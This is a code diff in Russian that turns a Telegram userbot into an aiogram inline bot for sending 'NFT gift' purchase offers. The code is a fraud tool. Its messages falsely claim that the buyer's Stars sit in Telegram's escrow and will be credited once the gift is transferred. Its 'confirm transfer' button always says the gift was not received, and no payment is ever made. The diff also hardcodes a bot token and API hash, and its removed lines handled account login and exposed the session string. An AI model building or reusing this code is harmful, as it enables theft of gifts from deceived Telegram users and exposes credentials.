@@ -1,5 +1,4 @@
-# userbot.py — NFT Deal Userbot | Telethon 1.x
-# Работает от твоего аккаунта, не бот — Telegram не режет офферы
+# bot_inline.py — NFT Deal Bot | Inline Mode | aiogram 3.31+
 import asyncio
 import logging
 import random
@@ -8,19 +7,22 @@ import sqlite3
 import string
 from datetime import datetime, timedelta
 
-from telethon import TelegramClient, events, Button
-from telethon.sessions import StringSession
-from aiogram import Bot
+from aiogram import Bot, Dispatcher, F
 from aiogram.client.default import DefaultBotProperties
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.filters import CommandStart, CommandObject
+from aiogram.types import (
+    CallbackQuery, InlineKeyboardButton, Message,
+    LinkPreviewOptions, InlineQueryResultArticle,
+    InputTextMessageContent, InlineQuery,
+    SwitchInlineMarkup
+)
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 
-# ── НАСТРОЙКИ ────────────────────────────────────────────────
-API_ID   = 38237346
-API_HASH = "5dc9220c75b83f01b47833778a2b5409"
-BOT_TOKEN = "8838053480:AAGjSxVlwocfBmEfHEQFRUHXmrjmOEA_3mo"
-ADMIN_ID  = 8926402887
-TRIGGER   = ".buy"    # команда
+TOKEN    = "8838053480:AAGjSxVlwocfBmEfHEQFRUHXmrjmOEA_3mo"
+ADMIN_ID = 8926402887
+
+bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
+dp  = Dispatcher()
 
 # ── БД ───────────────────────────────────────────────────────
 db = sqlite3.connect("deals.db", check_same_thread=False)
@@ -45,28 +47,50 @@ CREATE TABLE IF NOT EXISTS allowed_users (
 CREATE TABLE IF NOT EXISTS allowed_usernames (
     username        TEXT PRIMARY KEY
 );
+CREATE TABLE IF NOT EXISTS pending_offers (
+    order_id        TEXT PRIMARY KEY,
+    buyer_id        INTEGER,
+    buyer_username  TEXT,
+    nft_url         TEXT,
+    nft_slug        TEXT,
+    nft_num         TEXT,
+    amount          INTEGER,
+    created_at      TEXT
+);
 """)
 db.commit()
 
-# ── Клиенты ──────────────────────────────────────────────────
-# если есть сохранённая строка сессии — грузим её, иначе авторизуемся заново
-import os
-SESSION_FILE = "session_string.txt"
-try:
-    with open(SESSION_FILE) as f:
-        _session_str = f.read().strip()
-except FileNotFoundError:
-    _session_str = os.environ.get("TG_SESSION", "")
 
-client = TelegramClient(StringSession(_session_str), API_ID, API_HASH)
-bot    = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
+def gen_order_id() -> str:
+    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
 
-# состояния авторизации
-auth_state = {}
-auth_data  = {}
+def parse_nft(url: str):
+    m = re.match(r"https?://t\.me/nft/([A-Za-z]+)-(\d+)", url)
+    return (m.group(1), m.group(2)) if m else (None, None)
 
+def get_deal(order_id: str) -> dict | None:
+    row = db.execute("SELECT * FROM deals WHERE order_id=?", (order_id,)).fetchone()
+    return dict(row) if row else None
 
-# ── Доступ ───────────────────────────────────────────────────
+def get_pending(order_id: str) -> dict | None:
+    row = db.execute("SELECT * FROM pending_offers WHERE order_id=?", (order_id,)).fetchone()
+    return dict(row) if row else None
+
+def upd(order_id: str, **kw):
+    for k, v in kw.items():
+        db.execute(f"UPDATE deals SET {k}=? WHERE order_id=?", (v, order_id))
+    db.commit()
+
+def fmt_remaining(sent_at_str: str) -> str:
+    sent_at   = datetime.fromisoformat(sent_at_str)
+    deadline  = sent_at + timedelta(hours=6)
+    remaining = deadline - datetime.now()
+    if remaining.total_seconds() <= 0:
+        return "0 ч. 0 мин."
+    total_min = int(remaining.total_seconds() // 60)
+    h, m = divmod(total_min, 60)
+    return f"{h} ч. {m} мин."
+
 def is_allowed(user_id: int, username: str = None) -> bool:
     if user_id == ADMIN_ID:
         return True
@@ -97,74 +121,50 @@ def remove_user(value: str):
     db.commit()
 
 
-def gen_order_id() -> str:
-    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
-
-
-def parse_nft(url: str):
-    m = re.match(r"https?://t\.me/nft/([A-Za-z]+)-(\d+)", url)
-    return (m.group(1), m.group(2)) if m else (None, None)
-
-
-def get_deal(order_id: str) -> dict | None:
-    row = db.execute("SELECT * FROM deals WHERE order_id=?", (order_id,)).fetchone()
-    return dict(row) if row else None
-
-
-def upd(order_id: str, **kw):
-    for k, v in kw.items():
-        db.execute(f"UPDATE deals SET {k}=? WHERE order_id=?", (v, order_id))
-    db.commit()
-
-
-def fmt_remaining(sent_at_str: str) -> str:
-    sent_at   = datetime.fromisoformat(sent_at_str)
-    deadline  = sent_at + timedelta(hours=6)
-    remaining = deadline - datetime.now()
-    if remaining.total_seconds() <= 0:
-        return "0 ч. 0 мин."
-    total_min = int(remaining.total_seconds() // 60)
-    h, m = divmod(total_min, 60)
-    return f"{h} ч. {m} мин."
-
-
-def offer_text(d: dict) -> str:
+# ── Тексты ───────────────────────────────────────────────────
+def offer_text(p: dict, sent_at: str) -> str:
     return (
         f"Пользователь предлагает вам "
-        f"**{d['amount']:,} Звёзд** за подарок "
-        f"[{d['nft_slug']} #{d['nft_num']}]({d['nft_url']}).\n\n"
-        f"Оффер действителен ещё **{fmt_remaining(d['sent_at'])}**"
+        f"<b>{p['amount']:,} Звёзд</b> за подарок "
+        f"<a href=\"{p['nft_url']}\">{p['nft_slug']} #{p['nft_num']}</a>.\n\n"
+        f"Оффер действителен ещё <b>{fmt_remaining(sent_at)}</b>"
     )
-
 
 def deal_text(d: dict) -> str:
     return (
-        f"Ордер **#{d['order_id']}**\n\n"
-        f"Покупатель зарезервировал **{d['amount']:,} ⭐️ Звёзд** через эскроу-систему "
+        f"Ордер <b>#{d['order_id']}</b>\n\n"
+        f"Покупатель зарезервировал <b>{d['amount']:,} ⭐️ Звёзд</b> через эскроу-систему "
         f"Telegram. Средства хранятся на специальном эскроу-счёте и будут автоматически "
         f"зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
-        f"**Инструкция для завершения сделки:**\n"
+        f"<b>Инструкция для завершения сделки:</b>\n"
         f"1. Передайте подарок пользователю: @{d['buyer_username']}\n"
-        f"2. Нажмите «Передать NFT» и выберите [{d['nft_slug']} #{d['nft_num']}]({d['nft_url']})\n"
+        f"2. Нажмите «Передать NFT» и выберите <a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a>\n"
         f"3. Подтвердите передачу подарка.\n\n"
         f"Telegram зафиксирует транзакцию и моментально зачислит "
-        f"**{d['amount']:,} ⭐️ Звёзд** на ваш баланс. Резерв действует 24 часа."
+        f"<b>{d['amount']:,} ⭐️ Звёзд</b> на ваш баланс. Резерв действует 24 часа."
     )
 
 
-def offer_buttons(order_id: str):
-    return [
-        [Button.inline("Отклонить", f"decline:{order_id}"),
-         Button.inline("Принять",   f"accept:{order_id}")]
-    ]
+# ── Клавиатуры ───────────────────────────────────────────────
+def offer_kb(order_id: str):
+    kb = InlineKeyboardBuilder()
+    kb.row(
+        InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{order_id}"),
+        InlineKeyboardButton(text="Принять",   callback_data=f"accept:{order_id}")
+    )
+    return kb.as_markup()
 
-
-def deal_buttons(d: dict):
-    return [
-        [Button.inline("Передать NFT ↗",       f"transfer:{d['order_id']}")],
-        [Button.inline("Подтвердить передачу", f"confirm:{d['order_id']}")],
-    ]
-
+def deal_kb(d: dict):
+    kb = InlineKeyboardBuilder()
+    kb.row(InlineKeyboardButton(
+        text="Передать NFT ↗",
+        url=f"tg://send_gift?to={d['buyer_username']}"
+    ))
+    kb.row(InlineKeyboardButton(
+        text="Подтвердить передачу",
+        callback_data=f"confirm:{d['order_id']}"
+    ))
+    return kb.as_markup()
 
 def admin_kb(order_id: str):
     kb = InlineKeyboardBuilder()
@@ -176,283 +176,370 @@ def admin_kb(order_id: str):
 
 
 # ── Таймер ───────────────────────────────────────────────────
-async def offer_timer(order_id: str):
+async def offer_timer(order_id: str, chat_id: int, msg_id: int, sent_at: str):
     while True:
         await asyncio.sleep(60)
         d = get_deal(order_id)
         if not d or d['status'] != 'offer':
             break
-        deadline = datetime.fromisoformat(d['sent_at']) + timedelta(hours=6)
+        deadline = datetime.fromisoformat(sent_at) + timedelta(hours=6)
         if datetime.now() >= deadline:
             upd(order_id, status='expired')
             try:
-                await client.edit_message(
-                    d['chat_id'], d['offer_msg_id'],
-                    "Оффер истёк.", buttons=None
+                await bot.edit_message_text(
+                    "Оффер истёк.",
+                    chat_id=chat_id,
+                    message_id=msg_id,
+                    reply_markup=None
                 )
             except Exception:
                 pass
             break
+        p = get_pending(order_id)
+        if not p:
+            break
         try:
-            await client.edit_message(
-                d['chat_id'], d['offer_msg_id'],
-                offer_text(d),
-                buttons=offer_buttons(order_id),
-                link_preview=True,
-                parse_mode='md'
+            await bot.edit_message_text(
+                offer_text(p, sent_at),
+                chat_id=chat_id,
+                message_id=msg_id,
+                reply_markup=offer_kb(order_id),
+                link_preview_options=LinkPreviewOptions(
+                    url=p['nft_url'],
+                    show_above_text=True,
+                    prefer_large_media=True
+                )
             )
         except Exception:
             pass
 
 
-# ── .buy от владельца аккаунта ───────────────────────────────
-@client.on(events.NewMessage(outgoing=True, pattern=r"^\.buy\s+\S+\s+\d+"))
-async def on_buy(event):
-    me = await client.get_me()
-    sender_id = me.id
-    username  = me.username
+# ── /start ───────────────────────────────────────────────────
+@dp.message(CommandStart())
+async def cmd_start(message: Message, command: CommandObject):
+    uid = message.from_user.id
+    if uid == ADMIN_ID:
+        await message.answer("👋 Админ")
+        return
+    if not is_allowed(uid, message.from_user.username):
+        await message.answer("Бот недоступен.")
+        return
+    await message.answer("👋")
 
-    if not is_allowed(sender_id, username):
-        await event.delete()
+
+# ── /add /remove /users ───────────────────────────────────────
+@dp.message(F.text.startswith("/add "))
+async def cmd_add(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    val = message.text.split()[1]
+    add_user(val)
+    await message.answer(f"✅ Доступ выдан: {val}")
+
+@dp.message(F.text.startswith("/remove "))
+async def cmd_remove(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    val = message.text.split()[1]
+    remove_user(val)
+    await message.answer(f"✅ Доступ забран: {val}")
+
+@dp.message(F.text == "/users")
+async def cmd_users(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    ids   = db.execute("SELECT user_id FROM allowed_users").fetchall()
+    names = db.execute("SELECT username FROM allowed_usernames").fetchall()
+    if not ids and not names:
+        await message.answer("Список пуст.")
+        return
+    lines = [str(r['user_id']) for r in ids] + ["@" + r['username'] for r in names]
+    await message.answer("С доступом:\n" + "\n".join(lines))
+
+
+# ── .buy — создаём pending оффер и даём кнопку отправки ──────
+@dp.message(F.text.regexp(r"^https?://t\.me/nft/\S+\s+\d+"))
+async def cmd_buy(message: Message):
+    uid = message.from_user.id
+    if not is_allowed(uid, message.from_user.username):
+        await message.answer("Бот недоступен.")
         return
 
-    parts   = event.raw_text.strip().split()
-    nft_url = parts[1]
-    amount  = int(parts[2])
+    parts   = message.text.strip().split()
+    nft_url = parts[0]
+    amount  = int(parts[1])
 
     slug, num = parse_nft(nft_url)
     if not slug:
-        await event.delete()
+        await message.answer("❌ Неверная ссылка.")
         return
 
-    # удаляем .buy сообщение
-    await event.delete()
-
-    order_id = gen_order_id()
-    chat_id  = event.chat_id
-    sent_at  = datetime.now().isoformat()
-    buyer_username = username or str(sender_id)
+    order_id       = gen_order_id()
+    buyer_username = message.from_user.username or str(uid)
 
     db.execute("""
-        INSERT INTO deals
-          (order_id, buyer_username, chat_id, nft_url, nft_slug, nft_num,
-           amount, status, created_at, sent_at)
-        VALUES (?, ?, ?, ?, ?, ?, ?, 'offer', ?, ?)
-    """, (order_id, buyer_username, chat_id, nft_url, slug, num,
-          amount, sent_at, sent_at))
+        INSERT INTO pending_offers
+          (order_id, buyer_id, buyer_username, nft_url, nft_slug, nft_num, amount, created_at)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+    """, (order_id, uid, buyer_username, nft_url, slug, num, amount, datetime.now().isoformat()))
     db.commit()
 
-    d = get_deal(order_id)
+    # кнопка для отправки инлайн оффера в любой чат
+    kb = InlineKeyboardBuilder()
+    kb.row(InlineKeyboardButton(
+        text="📤 Отправить оффер продавцу",
+        switch_inline_query=order_id
+    ))
 
-    msg = await client.send_message(
-        chat_id,
-        offer_text(d),
-        buttons=offer_buttons(order_id),
-        link_preview=True,
-        parse_mode='md'
+    await message.answer(
+        f"✅ Оффер готов\n\n"
+        f"NFT: <b>{slug} #{num}</b>\n"
+        f"Сумма: <b>{amount:,} ⭐️</b>\n\n"
+        f"Нажми кнопку ниже и выбери чат продавца:",
+        reply_markup=kb.as_markup()
     )
-    upd(order_id, offer_msg_id=msg.id)
-    asyncio.create_task(offer_timer(order_id))
+
+
+# ── Инлайн запрос — продавец видит карточку оффера ───────────
+@dp.inline_query()
+async def inline_offer(query: InlineQuery):
+    order_id = query.query.strip()
+    if not order_id:
+        await query.answer([], cache_time=1)
+        return
+
+    p = get_pending(order_id)
+    if not p:
+        await query.answer([], cache_time=1)
+        return
+
+    sent_at = datetime.now().isoformat()
+
+    result = InlineQueryResultArticle(
+        id=order_id,
+        title=f"{p['nft_slug']} #{p['nft_num']} — {p['amount']:,} ⭐️",
+        description="Нажми чтобы отправить оффер",
+        input_message_content=InputTextMessageContent(
+            message_text=offer_text(p, sent_at),
+            parse_mode="HTML",
+            link_preview_options=LinkPreviewOptions(
+                url=p['nft_url'],
+                show_above_text=True,
+                prefer_large_media=True
+            )
+        ),
+        reply_markup=offer_kb(order_id)
+    )
+
+    await query.answer([result], cache_time=1, is_personal=True)
+
+
+# ── Chosen inline result — оффер отправлен, запускаем таймер ─
+@dp.chosen_inline_result()
+async def on_chosen(chosen):
+    order_id = chosen.result_id
+    p = get_pending(order_id)
+    if not p:
+        return
+
+    sent_at = datetime.now().isoformat()
+
+    # сохраняем сделку
+    db.execute("""
+        INSERT OR IGNORE INTO deals
+          (order_id, buyer_username, chat_id, nft_url, nft_slug, nft_num,
+           amount, status, created_at, sent_at)
+        VALUES (?, ?, 0, ?, ?, ?, ?, 'offer', ?, ?)
+    """, (order_id, p['buyer_username'], p['nft_url'], p['nft_slug'],
+          p['nft_num'], p['amount'], sent_at, sent_at))
+    db.commit()
+
+    # для таймера нужен inline_message_id
+    if chosen.inline_message_id:
+        asyncio.create_task(
+            offer_timer_inline(order_id, chosen.inline_message_id, sent_at, p)
+        )
 
     # уведомляем тебя
     try:
         await bot.send_message(
             ADMIN_ID,
-            f"📤 <b>Новый оффер</b>\n\n"
+            f"📤 <b>Оффер отправлен</b>\n\n"
             f"Ордер: <b>{order_id}</b>\n"
-            f"NFT: <b>{slug} #{num}</b>\n"
-            f"Сумма: <b>{amount:,} ⭐️</b>\n"
-            f"Ссылка: {nft_url}"
+            f"NFT: <b>{p['nft_slug']} #{p['nft_num']}</b>\n"
+            f"Сумма: <b>{p['amount']:,} ⭐️</b>"
         )
     except Exception as e:
         logging.error(e)
 
 
-# ── Входящие callback от кнопок ──────────────────────────────
-@client.on(events.CallbackQuery())
-async def on_callback(event):
-    data = event.data.decode()
-
-    # ── Принять ──────────────────────────────────────────────
-    if data.startswith("accept:"):
-        order_id = data.split(":")[1]
+async def offer_timer_inline(order_id: str, inline_msg_id: str, sent_at: str, p: dict):
+    while True:
+        await asyncio.sleep(60)
         d = get_deal(order_id)
         if not d or d['status'] != 'offer':
-            await event.answer("Оффер недоступен.", alert=True)
-            return
-
-        upd(order_id, status='active')
-        await event.answer(
-            "Внимание!\n\n"
-            "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
-            "Нажмите «ОК», если вы прочитали это сообщение.",
-            alert=True
-        )
+            break
+        deadline = datetime.fromisoformat(sent_at) + timedelta(hours=6)
+        if datetime.now() >= deadline:
+            upd(order_id, status='expired')
+            try:
+                await bot.edit_message_text(
+                    "Оффер истёк.",
+                    inline_message_id=inline_msg_id,
+                    reply_markup=None
+                )
+            except Exception:
+                pass
+            break
         try:
-            await client.edit_message(
-                d['chat_id'], d['offer_msg_id'],
-                deal_text(d),
-                buttons=deal_buttons(d),
-                link_preview=True,
-                parse_mode='md'
+            await bot.edit_message_text(
+                offer_text(p, sent_at),
+                inline_message_id=inline_msg_id,
+                reply_markup=offer_kb(order_id),
+                link_preview_options=LinkPreviewOptions(
+                    url=p['nft_url'],
+                    show_above_text=True,
+                    prefer_large_media=True
+                )
             )
-        except Exception as e:
-            logging.error(f"edit to deal: {e}")
-
-    # ── Отклонить ────────────────────────────────────────────
-    elif data.startswith("decline:"):
-        order_id = data.split(":")[1]
-        d = get_deal(order_id)
-        if not d:
-            return
-
-        upd(order_id, status='declined')
-        await event.answer("Вы отклонили оффер.")
-        try:
-            await client.edit_message(
-                d['chat_id'], d['offer_msg_id'],
-                f"Оффер на NFT [{d['nft_slug']} #{d['nft_num']}]({d['nft_url']}) отменён.",
-                buttons=None, link_preview=False, parse_mode='md'
-            )
-        except Exception as e:
-            logging.error(e)
-
-    # ── Передать NFT ─────────────────────────────────────────
-    elif data.startswith("transfer:"):
-        order_id = data.split(":")[1]
-        d = get_deal(order_id)
-        if not d:
-            return
-        await event.answer(
-            f"Откройте профиль @{d['buyer_username']} и передайте подарок {d['nft_slug']} #{d['nft_num']}.",
-            alert=True
-        )
-
-    # ── Подтвердить передачу ─────────────────────────────────
-    elif data.startswith("confirm:"):
-        order_id = data.split(":")[1]
-        d = get_deal(order_id)
-        if not d or d['status'] != 'active':
-            await event.answer("Ордер недоступен.", alert=True)
-            return
-
-        await event.answer(
-            "Внимание!\n\nТовар не получен, попробуйте передать ещё раз и нажмите кнопку.",
-            alert=True
-        )
-        try:
-            await bot.send_message(
-                ADMIN_ID,
-                f"🔔 <b>Попытка подтверждения</b>\n\n"
-                f"Ордер: <b>{d['order_id']}</b>\n"
-                f"NFT: <b>{d['nft_slug']} #{d['nft_num']}</b>\n"
-                f"Сумма: <b>{d['amount']:,} ⭐️</b>\n"
-                f"Покупатель: @{d['buyer_username']}\n"
-                f"Ссылка: {d['nft_url']}\n\n"
-                f"Нажми если NFT реально передан:",
-                reply_markup=admin_kb(order_id)
-            )
-        except Exception as e:
-            logging.error(e)
+        except Exception:
+            pass
 
 
-# ── /add /remove /users через Saved Messages ─────────────────
-@client.on(events.NewMessage(outgoing=True, chats="me", pattern=r"^/(add|remove|users)"))
-async def on_admin_cmd(event):
-    text = event.raw_text.strip()
-    await event.delete()
-
-    if text.startswith("/add "):
-        val = text.split()[1]
-        add_user(val)
-        await client.send_message("me", f"✅ Доступ выдан: {val}")
-
-    elif text.startswith("/remove "):
-        val = text.split()[1]
-        remove_user(val)
-        await client.send_message("me", f"✅ Доступ забран: {val}")
-
-    elif text == "/users":
-        ids   = db.execute("SELECT user_id FROM allowed_users").fetchall()
-        names = db.execute("SELECT username FROM allowed_usernames").fetchall()
-        if not ids and not names:
-            await client.send_message("me", "Список пуст.")
-            return
-        lines = [str(r['user_id']) for r in ids] + ["@" + r['username'] for r in names]
-        await client.send_message("me", "Пользователи с доступом:\n" + "\n".join(lines))
-
-
-# ── Бот для подтверждения/отклонения от админа ───────────────
-from aiogram import Dispatcher, F
-from aiogram.types import CallbackQuery as AioCallbackQuery
-
-bot_dp = Dispatcher()
-
-@bot_dp.message(F.text)
-async def auth_handler(msg):
-    uid = msg.from_user.id
-    if uid != ADMIN_ID:
+# ── Принять ──────────────────────────────────────────────────
+@dp.callback_query(F.data.startswith("accept:"))
+async def cb_accept(call: CallbackQuery):
+    order_id = call.data.split(":")[1]
+    d = get_deal(order_id)
+    p = get_pending(order_id)
+    src = d or p
+    if not src or (d and d['status'] != 'offer'):
+        await call.answer("Оффер недоступен.", show_alert=True)
         return
-    text = msg.text.strip()
 
-    if auth_state.get(uid) == "phone":
-        phone = text
-        auth_data[uid] = {"phone": phone}
-        try:
-            result = await client.send_code_request(phone)
-            auth_data[uid]["phone_code_hash"] = result.phone_code_hash
-            auth_state[uid] = "code"
-            await bot.send_message(uid, "📨 Код отправлен в Telegram. Введи код:")
-        except Exception as e:
-            from aiogram.utils.markdown import html_decoration as hd
-            await bot.send_message(uid, f"❌ Ошибка: {hd.quote(str(e))}")
-            auth_state.pop(uid, None)
+    if d:
+        upd(order_id, status='active')
+    else:
+        # создаём deal из pending
+        sent_at = datetime.now().isoformat()
+        db.execute("""
+            INSERT OR IGNORE INTO deals
+              (order_id, buyer_username, chat_id, nft_url, nft_slug, nft_num,
+               amount, status, created_at, sent_at)
+            VALUES (?, ?, 0, ?, ?, ?, ?, 'active', ?, ?)
+        """, (order_id, p['buyer_username'], p['nft_url'], p['nft_slug'],
+              p['nft_num'], p['amount'], sent_at, sent_at))
+        db.commit()
 
-    elif auth_state.get(uid) == "code":
-        code = text.replace(" ", "")
-        phone = auth_data[uid]["phone"]
-        phone_code_hash = auth_data[uid]["phone_code_hash"]
-        try:
-            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
-            await finish_auth(uid)
-        except Exception as e:
-            err = str(e)
-            if "2FA" in err or "password" in err.lower() or "SessionPasswordNeeded" in err:
-                auth_state[uid] = "2fa"
-                await bot.send_message(uid, "🔒 Введи облачный пароль (2FA):")
-            else:
-                from aiogram.utils.markdown import html_decoration as hd
-                await bot.send_message(uid, f"❌ Ошибка: {hd.quote(str(e))}")
-                auth_state.pop(uid, None)
+    src = get_deal(order_id)
 
-    elif auth_state.get(uid) == "2fa":
-        password = text
-        try:
-            await client.sign_in(password=password)
-            await finish_auth(uid)
-        except Exception as e:
-            from aiogram.utils.markdown import html_decoration as hd
-            await bot.send_message(uid, f"❌ Неверный пароль: {hd.quote(str(e))}")
-
-
-async def finish_auth(uid: int):
-    auth_state.pop(uid, None)
-    auth_data.pop(uid, None)
-    me = await client.get_me()
-    session_str = client.session.save()
-    with open(SESSION_FILE, "w") as f:
-        f.write(session_str)
-    await bot.send_message(
-        uid,
-        f"✅ Авторизован как @{me.username} ({me.id})\n\n"
-        f"<b>Строка сессии (сохрани):</b>\n<code>{session_str}</code>"
+    await call.answer(
+        "Внимание!\n\n"
+        "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
+        "Нажмите «ОК», если вы прочитали это сообщение.",
+        show_alert=True
     )
-    # сразу запускаем юзербот без перезапуска
-    asyncio.create_task(run_userbot())
+
+    try:
+        if call.inline_message_id:
+            await bot.edit_message_text(
+                deal_text(src),
+                inline_message_id=call.inline_message_id,
+                reply_markup=deal_kb(src),
+                link_preview_options=LinkPreviewOptions(
+                    url=src['nft_url'],
+                    show_above_text=True,
+                    prefer_large_media=True
+                )
+            )
+        else:
+            await bot.edit_message_text(
+                deal_text(src),
+                chat_id=call.message.chat.id,
+                message_id=call.message.message_id,
+                reply_markup=deal_kb(src),
+                link_preview_options=LinkPreviewOptions(
+                    url=src['nft_url'],
+                    show_above_text=True,
+                    prefer_large_media=True
+                )
+            )
+    except Exception as e:
+        logging.error(f"edit to deal: {e}")
 
 
-@bot_dp.callback_query(F.data.startswith("adm_ok:"))
-async def cb_adm_ok(call: AioCallbackQuery):
+# ── Отклонить ────────────────────────────────────────────────
+@dp.callback_query(F.data.startswith("decline:"))
+async def cb_decline(call: CallbackQuery):
+    order_id = call.data.split(":")[1]
+    d = get_deal(order_id)
+    p = get_pending(order_id)
+    src = d or p
+    if not src:
+        return
+
+    if d:
+        upd(order_id, status='declined')
+
+    await call.answer("Вы отклонили оффер.")
+
+    nft_url  = src['nft_url']
+    nft_slug = src['nft_slug']
+    nft_num  = src['nft_num']
+
+    try:
+        if call.inline_message_id:
+            await bot.edit_message_text(
+                f"Оффер на NFT <a href=\"{nft_url}\">{nft_slug} #{nft_num}</a> отменён.",
+                inline_message_id=call.inline_message_id,
+                reply_markup=None,
+                link_preview_options=LinkPreviewOptions(is_disabled=True)
+            )
+        else:
+            await bot.edit_message_text(
+                f"Оффер на NFT <a href=\"{nft_url}\">{nft_slug} #{nft_num}</a> отменён.",
+                chat_id=call.message.chat.id,
+                message_id=call.message.message_id,
+                reply_markup=None,
+                link_preview_options=LinkPreviewOptions(is_disabled=True)
+            )
+    except Exception as e:
+        logging.error(e)
+
+
+# ── Подтвердить передачу ─────────────────────────────────────
+@dp.callback_query(F.data.startswith("confirm:"))
+async def cb_confirm(call: CallbackQuery):
+    order_id = call.data.split(":")[1]
+    d = get_deal(order_id)
+    if not d or d['status'] != 'active':
+        await call.answer("Ордер недоступен.", show_alert=True)
+        return
+
+    await call.answer(
+        "Внимание!\n\nТовар не получен, попробуйте передать ещё раз и нажмите кнопку.",
+        show_alert=True
+    )
+
+    try:
+        await bot.send_message(
+            ADMIN_ID,
+            f"🔔 <b>Попытка подтверждения</b>\n\n"
+            f"Ордер: <b>{d['order_id']}</b>\n"
+            f"NFT: <b>{d['nft_slug']} #{d['nft_num']}</b>\n"
+            f"Сумма: <b>{d['amount']:,} ⭐️</b>\n"
+            f"Покупатель: @{d['buyer_username']}\n"
+            f"Ссылка: {d['nft_url']}\n\n"
+            f"Нажми если NFT реально передан:",
+            reply_markup=admin_kb(order_id)
+        )
+    except Exception as e:
+        logging.error(e)
+
+
+# ── Админ: подтвердить ───────────────────────────────────────
+@dp.callback_query(F.data.startswith("adm_ok:"))
+async def cb_adm_ok(call: CallbackQuery):
     if call.from_user.id != ADMIN_ID:
         return
     order_id = call.data.split(":")[1]
@@ -463,20 +550,22 @@ async def cb_adm_ok(call: AioCallbackQuery):
     upd(order_id, status='completed')
     await call.answer("Подтверждено.")
     await call.message.edit_reply_markup(reply_markup=None)
+    await call.message.answer(f"✅ Ордер {order_id} завершён.")
 
     try:
-        await client.send_message(
-            d['chat_id'],
-            f"Передача подтверждена!\n\nОрдер **#{d['order_id']}**\n"
-            f"**{d['amount']:,} ⭐️ Звёзд** зачислены на ваш баланс Telegram Stars.",
-            parse_mode='md'
-        )
+        if d.get('offer_msg_id') and d.get('chat_id'):
+            await bot.send_message(
+                d['chat_id'],
+                f"Передача подтверждена!\n\nОрдер <b>{d['order_id']}</b>\n"
+                f"<b>{d['amount']:,} ⭐️ Звёзд</b> зачислены на ваш баланс."
+            )
     except Exception as e:
         logging.error(e)
 
 
-@bot_dp.callback_query(F.data.startswith("adm_no:"))
-async def cb_adm_no(call: AioCallbackQuery):
+# ── Админ: не передан ────────────────────────────────────────
+@dp.callback_query(F.data.startswith("adm_no:"))
+async def cb_adm_no(call: CallbackQuery):
     if call.from_user.id != ADMIN_ID:
         return
     order_id = call.data.split(":")[1]
@@ -488,60 +577,25 @@ async def cb_adm_no(call: AioCallbackQuery):
     await call.answer("Отклонено.")
     await call.message.edit_reply_markup(reply_markup=None)
 
-    try:
-        await client.edit_message(
-            d['chat_id'], d['offer_msg_id'],
-            deal_text(d),
-            buttons=deal_buttons(d),
-            link_preview=True,
-            parse_mode='md'
-        )
-    except Exception as e:
-        logging.error(e)
 
-
-# ── Запуск ───────────────────────────────────────────────────
-async def run_userbot():
-    """Запускает юзербот после авторизации."""
-    try:
-        await client.run_until_disconnected()
-    except Exception as e:
-        logging.error(f"userbot error: {e}")
+# ── catch all ────────────────────────────────────────────────
+@dp.message()
+async def catch_all(message: Message):
+    if message.from_user.id == ADMIN_ID:
+        return
+    if not is_allowed(message.from_user.id, message.from_user.username):
+        await message.answer("Бот недоступен.")
 
 
 async def main():
     logging.basicConfig(level=logging.INFO)
-
     from aiogram.types import BotCommand
     await bot.set_my_commands([BotCommand(command="start", description="Запустить")])
-    await bot.delete_webhook(drop_pending_updates=True)
-
-    await client.connect()
-
-    if _session_str and await client.is_user_authorized():
-        me = await client.get_me()
-        logging.info(f"Userbot запущен как @{me.username} ({me.id})")
-        session_str = client.session.save()
-        with open(SESSION_FILE, "w") as f:
-            f.write(session_str)
-        try:
-            await bot.send_message(
-                ADMIN_ID,
-                f"✅ Юзербот запущен как @{me.username}"
-            )
-        except Exception:
-            pass
-        await asyncio.gather(
-            bot_dp.start_polling(bot, allowed_updates=["callback_query", "message"]),
-            run_userbot()
-        )
-    else:
-        # нет сессии или устарела — авторизация через бота
-        await bot.send_message(ADMIN_ID, "📱 Введи номер телефона для авторизации:\n(формат: +79001234567)")
-        auth_state[ADMIN_ID] = "phone"
-        # после finish_auth юзербот стартует сам через asyncio.create_task
-        await bot_dp.start_polling(bot, allowed_updates=["callback_query", "message"])
-
+    await dp.start_polling(
+        bot,
+        skip_updates=True,
+        allowed_updates=["message", "callback_query", "inline_query", "chosen_inline_result"]
+    )
 
 if __name__ == "__main__":
     asyncio.run(main())
